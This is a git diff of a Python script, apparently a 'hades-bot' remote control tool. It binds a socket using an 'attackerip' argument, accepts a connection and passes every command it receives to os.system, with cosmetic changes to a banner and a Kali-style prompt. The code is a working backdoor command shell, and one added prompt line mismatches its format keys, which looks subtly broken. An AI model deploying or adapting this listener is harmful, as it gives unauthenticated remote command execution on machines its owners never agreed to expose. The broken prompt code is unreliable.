@@ -14,9 +14,9 @@ class Controller(object):
     @staticmethod
     def show_banner(s):
         for c in s + '\n':
-            sys.stdout.write(bg.BLACK + Fore.GREEN + c)
+            sys.stdout.write(bg.BLACK + Fore.YELLOW + c)
             sys.stdout.flush()
-            time.sleep(2. / 100)
+            time.sleep(1.2 / 100)
         time.sleep(1.5)
         print('-----------------------------------------------------------------')
         print(Fore.WHITE + '[' + Fore.GREEN + '+' + Fore.WHITE + ']Made By Droid | Github:https://github.com/FonderElite')
@@ -24,32 +24,47 @@ class Controller(object):
         time.sleep(1.5)
 
     def listen(self):
-        server_ip = self.ip
-        server_port = self.port
-        buffer_values = lambda buff1,buff2 : buff1 * buff2
-        buffer_size = buffer_values(10240,1024)
-        SEPARATOR = "<sep>"
-        s = socket.socket()
-        s.bind((server_ip,int(server_port)))
-        s.listen(5)
-        print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]Starting Listener...")
-        time.sleep(1)
-        print(f"Listening as {server_ip}:{server_port}...")
-        client_socket, client_address = s.accept()
-        print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}][{client_address[0]}:{client_address[1]} Connected!")
-        time.sleep(1.5)
-        print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]You may now proceed executing commands in the controller.")
         try:
+            server_ip = self.ip
+            server_port = self.port
+            buffer_values = lambda buff1,buff2 : buff1 * buff2
+            buffer_size = buffer_values(10240,1024)
+            SEPARATOR = "<sep>"
+            s = socket.socket()
+            s.bind((server_ip,int(server_port)))
+            s.listen(5)
+            print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]Starting Listener...")
+            time.sleep(1)
+            print(f"Listening as {server_ip}:{server_port}...")
+            client_socket, client_address = s.accept()
+            print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}][{client_address[0]}:{client_address[1]} Connected!")
+            time.sleep(1.5)
+            print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]You may now proceed executing commands in the controller.")
             host = socket.gethostname()
+            uid = os.getuid()
+            global host_format
             while True:
-                cmd_read = client_socket.recv(buffer_size).decode()
-                arbitrary_cmd_exec = os.system(cmd_read)
-        except Exception:
-            print('\nUsage for help: python3 <file-name.py> -h ')
+                    working_directory = os.getcwd()
+                    if uid != 0:
+                        host_format = '''
+                                 ┌──({host_name})-[{cwd}]
+                                 └─$ '''.format(host=host,cwd=working_directory)
+                    elif uid == 0:
+                        host_format = '''
+                        ┌──(root💀{host})-[{cwd}]
+                        └─#'''.format(host=host,cwd=working_directory)
+                    cmd_read = client_socket.recv(buffer_size).decode()
+                    print(host_format,end='')
+                    airbitrary_cmd_exec = os.system(cmd_read)
+        except Exception as Err:
+            print(Err)
+            print('\nUsage for help: python3 <hades-bot.py> -h ')
+
+
 if __name__ == "__main__":
     main_class = Controller(args.attackerip,args.port)
     banner = Process(target=main_class.show_banner,args=('''
-       .:'                                  `:.
+  .:'                                  `:.
  ::'                                    `::
 :: :.                                  .: ::
  `:. `:.             .             .:'  .:'
@@ -69,11 +84,12 @@ if __name__ == "__main__":
              `.  ``     ''  .'
               :`...........':
               ` :`.     .': '
-               `:  `"""'  :'  
+               |            |
+               `:  `"""'  :'
+                -.........-
     ''',)) 
     listener = Process(target=main_class.listen)
     banner.start()
     banner.join()
     listener.start()
     listener.join()
-
